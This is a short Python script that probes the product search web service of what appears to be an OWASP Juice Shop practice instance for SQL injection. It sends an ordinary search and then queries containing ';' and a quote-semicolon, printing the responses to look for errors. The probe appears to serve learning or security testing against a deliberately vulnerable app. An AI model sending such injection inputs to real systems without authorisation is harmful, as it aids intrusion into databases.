import requests
import json

base_url="https://juice-shop-kha.herokuapp.com"

### Find rest/products/search?q= web service

search_ws="/rest/products/search?q="

apple_response = requests.get(base_url +  search_ws + "apple")

print(apple_response.json())

### Try injecting sql character

with_sql_1 = requests.get(base_url + search_ws + ";")

print(with_sql_1.json())

print("")

with_sql_2 = requests.get(base_url + search_ws + "';", headers={'Accept': 'application/json'})

print(json.dumps(with_sql_2.json(), indent=4))

exit()

